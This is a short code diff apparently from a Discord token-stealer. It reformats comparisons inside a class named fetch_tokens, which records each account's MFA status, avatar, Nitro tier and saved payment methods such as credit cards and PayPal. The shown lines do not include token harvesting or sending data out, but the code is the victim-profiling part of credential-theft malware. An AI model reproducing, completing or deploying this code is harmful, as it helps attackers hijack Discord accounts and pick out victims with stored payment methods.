@@ -138,13 +138,13 @@ class fetch_tokens:
             mfa = user['mfa_enabled']
             avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
             
-            if user['premium_type']== 0:
+            if user['premium_type'] == 0:
                 nitro = 'None'
-            elif user['premium_type']== 1:
+            elif user['premium_type'] == 1:
                 nitro = 'Nitro Classic'
-            elif user['premium_type']== 2:
+            elif user['premium_type'] == 2:
                 nitro = 'Nitro'
-            elif user['premium_type']== 3:
+            elif user['premium_type'] == 3:
                 nitro = 'Nitro Basic'
             else:
                 nitro = 'None'
@@ -152,9 +152,9 @@ class fetch_tokens:
             if billing:
                 payment_methods = []
                 for method in billing:
-                    if method['type']== 1:
+                    if method['type'] == 1:
                         payment_methods.append('Credit Card')
-                    elif method['type']== 2:
+                    elif method['type'] == 2:
                         payment_methods.append('PayPal')
                     else:
                         payment_methods.append('Unknown')
